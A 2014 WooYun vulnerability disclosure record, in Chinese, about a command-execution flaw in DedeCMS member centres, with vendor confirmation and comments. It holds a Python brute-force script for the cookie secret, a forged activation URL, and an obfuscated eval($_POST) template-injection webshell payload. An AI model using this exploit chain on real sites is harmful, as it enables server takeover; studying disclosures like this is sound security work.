{"id": 4031, "wybug_id": "wooyun-2014-052010", "wybug_title": "Dedecms某命令执行漏洞", "wybug_corp": "Dedecms", "wybug_author": "kobin97", "wybug_date": "2014-02-25 20:56", "wybug_open_date": "2014-05-26 20:56", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向公众公开  简要描述： 这个命令执行漏洞也存在有一段时间了，需要会员中心，所以有点鸡肋。。在以前的版本还需要后台一些配置才行。但发现最新版本，默认安装，开了会员中心就能利用了（不管邮件验证哦！）。 详细说明：  首先,会员中心开放，注册一个号。默认情况下，注册的号码需要邮件验证，但通常没法收取邮件的，所以没法激活，什么也不能操作。#先说说这个激活吧：我们看看激活函数 index_do.php\n$mid = intval($mid);    if(empty($mid))    {        ShowMsg('你的效验串不合法！', '-1');        exit();    }    $row = $dsql->GetOne(\"SELECT * FROM `#@__member` WHERE mid='{$mid}' \");    $needUserhash = md5($cfg_cookie_encode.'--'.$mid.'--'.$row['email']);    if($needUserhash != $userhash)    {        ShowMsg('你的效验串不合法！', '-1');        exit();    }\n注意到：md5($cfg_cookie_encode.'--'.$mid.'--'.$row['email']);mid email 已知。就是差 $cfg_cookie_encode 没法知道。搜索 $cfg_cookie_encode 的使用发现：cookie.helper.php 中\nfunction GetCookie($key)    {        global $cfg_cookie_encode;        if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) )        {            return '';        }        else        {            if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))            {                return '';            }            else            {                return $_COOKIE[$key];            }        }    }\n查看 cookie ，不难发现：\n\n即：substr(md5($cfg_cookie_encode.\"8\"),0,16) == \"b07a81b5365b0449\"我们再看看 $cfg_cookie_encode 是怎样生成的$rnd_cookieEncode = chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('A'),ord('Z'))).chr(mt_rand(ord('a'),ord('z'))).mt_rand(1000,9999).chr(mt_rand(ord('A'),ord('Z')));即：A-Z a-z A-Z A-Z a-z 1000-9999 A-Z就这几位，很有规律。我简单写一个爆破程序\n#! /usr/bin/env python#-*- coding: utf-8 -*-from hashlib import md5import sysimport stringdef getmd5(str):    m = md5()    m.update(str)      return m.hexdigest()if __name__ == \"__main__\":   if len(sys.argv) == 3:      value=str(sys.argv[1])      ckMd5=str(sys.argv[2])      lowercase =  string.lowercase      uppercase = string.uppercase      for a1 in uppercase:          for a2 in lowercase:              for a3 in uppercase:                  for a4 in uppercase:                      for a5 in lowercase:                          for a6 in range(1000,10000):                              for a7 in uppercase:                                  print (a1 + a2 + a3 + a4 + a5 + str(a6) + a7)                                  result = getmd5(a1 + a2 + a3 + a4 + a5 + str(a6) + a7 + value)[:16];                                  if result == ckMd5:                                      print '----------------------------'                                      print 'ck:' + (a1 + a2 + a3 + a4 + a5 + str(a6) + a7)                                      sys.exit(0)      sys.exit(0)   else:       print (\"usage: %s value ckMd5\" % sys.argv[0])       sys.exit(-1)\n离线爆破，很快会有结果。不过这里的py效率不高，也可以直接生成字典。方便秒查A-Z a-z A-Z A-Z a-z 1000-9999 A-Z （1-1000）注册时 id或者其它md5爆破工具也行\n\n结果出来后：OeQDg2992Z--8--aaaaaa@21cn.com943ea8a69319e9dd17bc3b8245631300http://127.0.0.1/dede/member/index_do.php?fmdo=checkMail&mid=8&userhash=943ea8a69319e9dd17bc3b8245631300会员激活成功了。。。可以进入下一步操作。转到内容 -> 上传软件 ，这里可以添加内容（旧版默认是没有隶属栏目的，所以不能利用，最新版带有了。）#命令执行：添加上传软件本地地址 http://www.hao123.com其它乱填就行，添加成功后，再次进入修改界面软件地址改为：http://www.hao123.com}x{/dede:link}{dede:a text'=x']=0;eval(chr(101).chr(118).chr(97).chr(108).chr(40).chr(34).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(93).chr(59).chr(34).chr(41).chr(59));// }xxxx{/dede:a}{dede:link}其实利用的是对软件地址的解释漏洞可以打开 data\\tplcache 目录，找到相关解释后的文件\n\n可以从上图看到，数组的键被闭合上了。再次打开修改页面时，即包含了该文件，从而造成命令执行漏洞。（ps:5.6版，插入的代码可能有所不同，请自行测试）   漏洞证明：  \n\n   修复方案：  我也不懂了，很久的漏洞。   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-02-28 14:20 厂商回复： 已经修复，感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-25 20:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  命令执行是说可以拿shell么    \n     2014-02-25 20:56 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  前排第一个关注！    \n     2014-02-25 20:57 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  XXOOing    \n     2014-02-25 20:58 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  坐等细节~    \n     2014-02-25 20:59 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  你关注的白帽子 kobin97 发表了漏洞 Dedecms某命令执行漏洞    \n     2014-02-25 21:00 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  屌，刚刚分析完乌云这两天的两个漏洞，kobin97黑阔发的真的不鸡肋啊    \n     2014-02-25 21:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力死了！洞主你们是互砍抢镜吗……    \n     2014-02-25 21:32 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  前排卖摔炮、棒棒糖-----牛花花    \n     2014-02-25 21:41 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  腿收一下    \n     2014-02-25 22:15 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  我擦前排    \n     2014-02-25 22:18 |    \t\tlsh4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:14        | 不是黑客!但是黑客手段都要会?)\t\t \n  dede是不是跑出内奸了这两天。。。出来造福社会么    \n     2014-02-25 22:31 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  DEDE这两天被爆了这么多洞    \n     2014-02-25 22:32 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  @My5t3ry 好屌 By：小冰    \n     2014-02-25 23:04 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  dedecms 你为什么还活着？    \n     2014-02-25 23:25 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  目测会火    \n     2014-02-26 08:33 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  命令执行是说可以拿shell么    \n     2014-02-26 13:21 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  你们再这样下去，dede工程师要用板砖抗议了    \n     2014-02-28 14:54 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @My5t3ry 快分析完了告诉我结果    \n     2014-05-14 22:43 |    \t\t蓝莓说 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 爱网络安全 代码审计 php网站开发)\t\t \n  python 4.py  17 d7c2eaeed6df6c39   这样做吧     \n     2014-05-15 00:49 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @kobin97 激活貌似能绕， /member/index_do.php?fmdo=user&dopost=regnew&step=2注册后直接访问 \"完善资料\" 的url，\"完善\"一下就激活了。@Dedecms 这也算个洞吧，最新版本也还存在。    \n     2014-05-15 17:59 |    \t\t蓝莓说 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 爱网络安全 代码审计 php网站开发)\t\t \n  感谢 @kobin97    \n     2014-05-31 08:11 |    \t\tlostwolf \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 学习中...)\t\t \n  很肥美的洞洞    \n     2015-07-21 14:55 |    \t\tDreamin \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @loopx9 牛逼，~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}